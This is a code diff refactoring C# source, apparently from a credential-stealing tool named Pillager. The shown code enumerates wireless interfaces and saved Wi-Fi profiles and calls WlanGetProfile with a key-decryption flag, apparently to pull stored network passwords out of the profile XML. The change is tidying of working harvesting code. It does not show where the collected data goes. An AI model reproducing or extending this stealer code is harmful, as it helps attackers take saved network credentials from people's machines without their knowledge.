@@ -1,12 +1,8 @@
-﻿using Pillager.Helper;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.IO;
-using System.Linq;
-using System.Net;
-using System.Runtime.InteropServices;
 using System.Text;
 using System.Xml;
+using Pillager.Helper;
 
 namespace Pillager.Others
 {
@@ -17,22 +13,18 @@ namespace Pillager.Others
         {
             const int dwClientVersion = 2;
             IntPtr clientHandle = IntPtr.Zero;
-            IntPtr pdwNegotiatedVersion = IntPtr.Zero;
             IntPtr pInterfaceList = IntPtr.Zero;
             Native.WLAN_INTERFACE_INFO_LIST interfaceList;
             Native.WLAN_PROFILE_INFO_LIST wifiProfileList;
             Guid InterfaceGuid;
-            IntPtr pAvailableNetworkList = IntPtr.Zero;
-            string wifiXmlProfile = null;
-            IntPtr wlanAccess = IntPtr.Zero;
             IntPtr profileList = IntPtr.Zero;
-            string profileName = "";
+            string profileName;
             StringBuilder sb = new StringBuilder();
 
             try
             {
                 // Open Wifi Handle
-                Native.WlanOpenHandle(dwClientVersion, IntPtr.Zero, out pdwNegotiatedVersion, ref clientHandle);
+                Native.WlanOpenHandle(dwClientVersion, IntPtr.Zero, out _, ref clientHandle);
 
                 Native.WlanEnumInterfaces(clientHandle, IntPtr.Zero, ref pInterfaceList);
                 interfaceList = new Native.WLAN_INTERFACE_INFO_LIST(pInterfaceList);
@@ -50,7 +42,7 @@ namespace Pillager.Others
                     {
                         profileName = (wifiProfileList.ProfileInfo[i]).strProfileName;
                         int decryptKey = 63;
-                        Native.WlanGetProfile(clientHandle, InterfaceGuid, profileName, IntPtr.Zero, out wifiXmlProfile, ref decryptKey, out wlanAccess);
+                        Native.WlanGetProfile(clientHandle, InterfaceGuid, profileName, IntPtr.Zero, out var wifiXmlProfile, ref decryptKey, out _);
                         XmlDocument xmlProfileXml = new XmlDocument();
                         xmlProfileXml.LoadXml(wifiXmlProfile);
                         XmlNodeList pathToSSID = xmlProfileXml.SelectNodes("//*[name()='WLANProfile']/*[name()='SSIDConfig']/*[name()='SSID']/*[name()='name']");
